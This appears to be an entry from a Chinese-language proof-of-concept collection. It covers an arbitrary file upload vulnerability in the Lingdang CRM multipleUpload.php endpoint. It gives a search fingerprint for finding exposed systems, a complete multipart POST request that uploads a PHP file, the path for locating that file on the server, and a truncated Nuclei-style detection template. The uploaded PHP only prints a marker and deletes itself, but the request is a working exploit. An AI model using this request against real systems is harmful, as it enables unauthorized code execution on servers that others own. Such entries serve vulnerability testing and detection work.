# 灵当CRM客户管理系统multipleupload任意文件上传漏洞

- **系统**：灵当CRM客户管理系统multipleupload　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1`
- **关键头**：`Content-Length: 254`　`Content-Type: multipart/form-data; boundary=---------------------------w5j…`　`Cookie: PHPSESSID=q8n9njtnr88vintfeads41j8og`

**请求体 / payload**
```
-----------------------------w5jpbdxm77tff7kvw5l78nswyv
Content-Disposition: form-data; name="file"; filename="u1pi5o.php"
Content-Type: image/png
<?php echo 'holetest';unlink(__FILE__);?>
-----------------------------w5jpbdxm77tff7kvw5l78nswyv--
上传定位：
GET /crm/storage/2024/September/week1/u1pi5o.php HTTP/1.1
Host:
```
- **预期**：200　|　—

**其他**
- （Yaml检测）: | id: ldcrm-multipleUpload-fileup<br/><br/>info:<br/>  name: ldcrm-multipleUpload-fileup<br/>  author: ldcrm-multipleUpload-fileup<br/>  severity: Critical<br/><br/>variables:<br/>  filename: "{{to_lower(rand_base(6))}}"<br/>  boundary: "{{to_lower(rand_base(26))}}"<br/><br/>http:<br/>  - raw:<br/>      - |<br/>        POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1<br